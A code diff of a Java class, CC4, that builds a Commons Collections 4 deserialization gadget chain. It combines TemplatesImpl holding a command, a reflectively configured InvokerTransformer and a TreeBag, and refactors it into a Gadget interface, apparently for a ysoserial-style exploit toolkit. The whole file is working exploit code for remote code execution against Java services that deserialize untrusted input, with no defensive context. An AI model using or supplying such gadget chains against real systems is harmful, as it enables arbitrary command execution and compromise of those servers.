@@ -4,15 +4,14 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.gadget.inter.Gadget;
 import org.util.TemplateUtils;
 
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 
-public class CC4 {
-    public static byte[] getBytes(String common) throws Exception {
+public class CC4 implements Gadget {
+    public Object getObject(String common) throws Exception {
         TemplatesImpl template = TemplateUtils.getTemplate(common);
         Constructor<InvokerTransformer> declaredConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
         declaredConstructor.setAccessible(true);
@@ -26,8 +25,6 @@ public class CC4 {
         iMethodName.setAccessible(true);
         iMethodName.set(newTransformer,"newTransformer");
 
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        new ObjectOutputStream(byteArrayOutputStream).writeObject(tb);
-        return byteArrayOutputStream.toByteArray();
+        return tb;
     }
 }
